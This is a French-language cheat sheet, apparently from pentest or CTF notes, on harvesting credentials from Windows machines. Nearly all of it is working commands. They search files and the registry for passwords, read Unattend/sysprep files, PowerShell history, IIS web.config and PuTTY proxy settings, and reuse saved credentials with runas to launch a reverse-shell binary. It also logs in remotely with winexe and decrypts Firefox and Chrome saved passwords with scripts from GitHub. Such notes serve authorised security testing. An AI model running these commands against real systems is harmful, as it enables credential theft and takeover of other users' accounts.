# Harvesting Passwords

Le moyen le plus simple d’accéder à un autre utilisateur consiste à collecter les informations d’identification

## Cleartext Passwords

```sh
findstr /si password *.txt *.xml *.ini

dir /s *pass* == *cred** == *vnc* == *.config

findstr /spin "password" *.*

# Registre
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

Se connecter a l'utilisateur
```sh
winexe -U 'admin%password' //<TARGET_IP> cmd.exe
```

## Unattended Windows Installations

Installations Windows sans surveillance
nécessitent l'utilisation d'un compte administrateur pour effectuer la configuration initiale, qui peut finir par être stockée sur la machine aux emplacements suivants:

```sh
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
```

## Powershell History

```sh
#cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```sh
#powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Saved Windows Credentials 

Windows nous permet d'utiliser les informations d'identification d'autres utilisateurs. Afficher les avec

```sh
cmdkey /list
```

Si vous remarquez des informations d'identification qui valent la peine d'être essayées (`Type: Domaine Password`)

```sh
runas /savecred /user:<USERNAME_NAME> cmd.exe
runas /savecred /user:<USERNAME_NAME> C:\Temp\rshell.exe
```

## IIS Configuration

Selon la version installée d'IIS, nous pouvons trouver `web.config` dans l'un des emplacements suivants

```sh
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software

Récupérer les informations d'identification à partir du logiciel

**PuTTY**

Stock les configurations de proxy qui incluent les informations d'authentification en texte clair.

```sh
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Firefox**

Chercher `firefox_decrypt.py` sur github

```sh
python firefox_decrypt.py C:\Users\Appdata\Roaming\Mozilla\Firefox\Profiles\7s6z2hv1.default-release
```

**Chrome**

Tout d'abord installer ces modules sur la cible `pip install pypiwin32 pycryptodomex`
Chercher `decrypt-chrome-passwords.py` sur github

```sh
python decrypt-chrome-passwords.py 
```